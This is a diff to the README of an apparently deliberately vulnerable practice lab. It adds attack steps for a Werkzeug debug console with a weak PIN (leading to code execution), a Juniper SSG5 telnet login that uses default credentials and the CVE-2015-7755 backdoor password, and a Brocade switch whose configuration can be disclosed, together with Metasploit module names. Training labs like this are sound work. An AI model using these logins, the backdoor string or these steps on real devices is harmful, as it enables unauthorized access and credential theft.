@@ -29,13 +29,16 @@ three IPs are what you scan. The loot refers to the boxes by the hostnames
 | **web01**   | DVWA           | 80/tcp    | `admin` / `password`*   | SQLi, XSS, file upload, cmd injection  |
 |             | FTP            | 21/tcp    | `ftp` / `ftp`, writable | weak creds / writable FTP root         |
 |             | SSH            | 22/tcp    | `root` / `root`         | weak SSH creds                         |
+|             | Werkzeug       | 5000/tcp  | PIN `1234`              | Flask debug console → RCE              |
 | **files01** | NFS export     | 2049/tcp  | `/data`, `rw,*`         | **open NFS share** (no_root_squash)    |
 |             | Samba `public` | 445,139   | guest, writable         | anonymous SMB share                    |
 |             | Redis          | 6379/tcp  | no auth                 | unauthenticated Redis (→ RCE/key write)|
 |             | SNMP (v2c)     | 161/udp   | community `public`/`private` | default SNMP community strings    |
+|             | Juniper SSG5   | 23/tcp    | `netscreen`/`netscreen` or CVE-2015-7755 | weak telnet creds + hardcoded backdoor |
 | **app01**   | WordPress 4.6  | 80/tcp    | set during install      | outdated WP core/plugins (CVEs)        |
 |             | Tomcat Manager | 8080/tcp  | `tomcat` / `tomcat`     | default manager creds → WAR-to-shell   |
 |             | MySQL          | 3306/tcp  | `root` / `root`         | weak DB root creds                     |
+|             | Brocade FWS624 | 23/tcp    | `username`/`password`   | weak telnet creds, config disclosure   |
 | **desk01**  | X11            | 6000/tcp  | none (access control off)| open X display → screenshot/keylog    |
 |             | RDP (xrdp)     | 3389/tcp  | `ubuntu` / `ubuntu`     | weak RDP creds                         |
 
@@ -208,8 +211,26 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   `jsmith`/`password123` and `backup`/`letmein`.
 - `ssh root@<web01-ip>` → `root`/`root`, or the looted `jsmith`, `agarcia`,
   `backup` accounts (see the credentials table).
+- Werkzeug debug console (port 5000):
+  ```bash
+  curl http://<web01-ip>:5000/crash   # triggers the interactive debugger page
+  # Navigate to http://<web01-ip>:5000/crash in a browser
+  # Enter PIN: 1234  → Python console → RCE
+  # msf: use exploit/multi/http/werkzeug_debug_rce
+  ```
+  The PIN is intentionally weak (`1234`). In a real engagement you'd compute it
+  from `/proc/net/arp`, `/etc/machine-id`, and the app's `/proc/self/cgroup`.
 
 **files01**
+- Juniper SSG5 (port 23):
+  ```bash
+  telnet <files01-ip>
+  # login: netscreen  password: netscreen
+  # or CVE-2015-7755 backdoor: any username + password: <<< %s(un='%s') = %u
+  # commands: get system, get config, ?
+  # msf: use auxiliary/scanner/telnet/juniper_backdoor (CVE-2015-7755)
+  #      use auxiliary/scanner/telnet/juniper_config
+  ```
 - NFS: `showmount -e <files01-ip>`, then
   `mkdir /mnt/nfs && mount -t nfs <files01-ip>:/data /mnt/nfs` and dig through it.
   `no_root_squash` lets you write files owned by root. The share is stocked like
@@ -235,6 +256,17 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   backup-job credential that works on web01.
 
 **app01**
+- Brocade FWS624 / ICX6450 (port 23):
+  ```bash
+  telnet <app01-ip>
+  # username/password, ttrogdon/ttrogdon, or dmudd/crazypassword
+  # enable → prompts for username+password again
+  # show config / show running-config → credential disclosure
+  # show version → firmware version
+  # switchversion → toggle 7.2 ↔ 7.4 response
+  # msf: use auxiliary/scanner/telnet/brocade_enable_login
+  #      use auxiliary/scanner/telnet/brocade_config
+  ```
 - `http://<app01-ip>/` → finish the WordPress wizard (WP 4.6 has core CVEs; see
   the plugin note below). Then run the seed command from Deploy so
   `jsmith`/`password123`, `agarcia`/`123456`, `backup`/`letmein` log into wp-admin.
